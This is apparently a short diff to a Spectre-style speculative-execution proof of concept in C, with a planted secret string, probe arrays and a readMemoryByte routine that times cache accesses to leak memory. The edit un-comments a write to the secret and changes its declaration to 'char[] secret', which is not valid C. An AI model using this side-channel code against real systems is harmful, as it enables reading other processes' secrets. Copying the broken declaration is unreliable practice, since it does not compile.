@@ -37,7 +37,7 @@ uint8_t array1[160] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 uint8_t bigArray[4096*512];
-char * secret = "The password is rootkea";
+char[] secret = "The password is rootkea";
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 volatile uint8_t* addr;
 
@@ -80,11 +80,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
         
-
         addr = &bigArray[malicious_x];
-
-        //secret[0] = 'q';
-
+        secret[0] = 'q';
         data = *addr;
         //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
         temp &= array2[data * 512];
